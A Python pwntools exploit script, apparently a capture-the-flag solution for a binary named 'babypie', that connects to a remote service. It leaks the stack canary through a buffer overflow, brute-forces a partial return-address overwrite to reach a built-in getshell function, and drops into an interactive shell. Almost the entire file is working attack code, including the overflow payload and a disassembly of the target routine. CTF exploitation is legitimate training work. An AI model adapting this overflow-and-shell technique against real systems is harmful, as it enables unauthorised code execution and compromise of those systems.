#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./babypie"
libcPath = "./babypie.so"
remoteAddr = "101.71.29.5"
remotePort = 10000

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
context.log_level = "debug"
elf = context.binary

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)
    #  raw_input("DEBUG: ")

if __name__ == "__main__":
    #  DEBUG([0xA08], True)
    while True:
        #  io = process(elfPath, env = {"LD_PRELOAD": libcPath})
        io = remote(remoteAddr, remotePort)
        io.sendafter(":\n", 'a' * 41)
        io.recvuntil('a' * 41)
        canary = '\0' + io.recvn(7)
        print canary.encode('hex')
        stack = u64(io.recvn(6).ljust(8, '\0')) - 0x50
        success("stack", stack)
        '''
        .text:0000000000000A3E getshell        proc near
        .text:0000000000000A3E ; __unwind {
        .text:0000000000000A3E                 push    rbp
        .text:0000000000000A3F                 mov     rbp, rsp
        .text:0000000000000A42                 lea     rdi, command    ; "/bin/sh"
        .text:0000000000000A49                 call    _system
        .text:0000000000000A4E                 nop
        .text:0000000000000A4F                 pop     rbp
        .text:0000000000000A50                 retn
        .text:0000000000000A50 ; } // starts at A3E
        '''
        payload = 'a' * 40 + canary + 'aaaaaaaa' + '\x3e\x6a'
        io.send(payload)
        
        try:
            io.sendline("ls")
        except:
            io.close()
            continue
        io.interactive()
    
    
